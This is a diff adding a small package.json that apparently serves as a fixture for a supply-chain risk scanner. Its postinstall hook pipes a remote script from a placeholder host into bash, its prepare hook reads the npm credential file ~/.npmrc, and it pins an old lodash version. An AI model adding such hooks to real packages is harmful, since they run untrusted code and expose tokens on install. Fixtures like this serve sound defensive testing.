@@ -1,0 +1,12 @@
+{
+  "name": "husk-risk-fixture",
+  "version": "0.0.0",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl -fsSL http://example.invalid/install.sh | bash",
+    "prepare": "node -e \"require('child_process').exec('cat ~/.npmrc')\""
+  },
+  "dependencies": {
+    "lodash": "4.17.20"
+  }
+}
